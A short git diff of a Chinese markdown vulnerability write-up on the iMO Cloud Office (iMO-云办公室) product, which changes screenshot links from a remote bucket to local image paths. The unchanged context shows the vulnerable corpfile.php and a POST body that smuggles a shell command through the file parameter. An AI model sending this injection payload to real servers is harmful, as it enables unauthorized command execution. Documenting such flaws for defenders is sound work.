@@ -20,7 +20,7 @@ app="iMO-云办公室"
 
 登录页面
 
-![image-20220524171455819](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241717875.png)
+![image-20220524171455819](./images/202205241717875.png)
 
 漏洞文件 corpfile.php
 
@@ -82,4 +82,4 @@ POST /corpfile.php
 type=corpLogo&command=id&file=;pwd>1.txt
 ```
 
-![image-20220524172000786](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241720866.png)
+![image-20220524172000786](./images/202205241720866.png)
